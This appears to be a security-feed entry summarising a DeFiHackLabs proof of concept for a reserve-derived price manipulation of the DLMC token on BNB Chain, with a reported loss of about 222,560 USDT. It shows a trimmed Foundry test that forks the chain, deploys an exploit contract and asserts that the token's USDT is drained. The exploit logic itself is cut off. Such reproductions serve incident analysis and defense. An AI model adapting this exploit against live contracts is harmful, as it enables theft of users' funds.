# [?] DLMC - Reserve-derived livePrice manipulation

## Summary
Severity: Unknown
Chain: BNB Chain
Component: DLMC
Published: 2026-06-24
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/DLMC_exp.sol
Type: defi-exploit-poc

## Details
Lost: 222,560.22 USDT

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 106_091_606;
        vm.createSelectFork("bsc", forkBlock);
        fundingToken = USDT_TOKEN;

        vm.label(ATTACKER, "Attacker profit receiver");
        vm.label(ATTACK_DEPLOYER, "Attack deployer");
        vm.label(DLMC_TOKEN, "DLMCToken");
        vm.label(USDT_TOKEN, "USDT");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(PANCAKE_USDT_WBNB_PAIR, "Pancake USDT/WBNB pair");
        vm.label(REGISTERED_REFERRER, "Registered DLMC referrer");
    }

    function testExploit() public balanceLog2(ATTACKER) {
        uint256 attackerBefore = IERC20(USDT_TOKEN).balanceOf(ATTACKER);

        vm.startPrank(ATTACK_DEPLOYER, ATTACK_DEPLOYER);
        DLMCExploit exploit = new DLMCExploit(ATTACKER);
        exploit.execute();
        vm.stopPrank();

        uint256 profit = IERC20(USDT_TOKEN).balanceOf(ATTACKER) - attackerBefore;
        logTokenBalance(USDT_TOKEN, ATTACKER, "Attacker Final");
        assertGt(profit, 222_000 ether, "USDT profit after Pancake repayment");
        assertLe(IERC20(USDT_TOKEN).balanceOf(DLMC_TOKEN), 10, "DLMCToken USDT drained");
    }
}

contract DLMCExploit {
    IDLMCToken private constant dlmc = IDLMCToken(DLMC_TOKEN);
    IERC20 private constant usdt = IERC20(USDT_TOKEN);
    IPancakePair private constant pair = IPancakePair(PANCAKE_USDT_WBNB_PAIR);

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/DLMC_exp.sol_
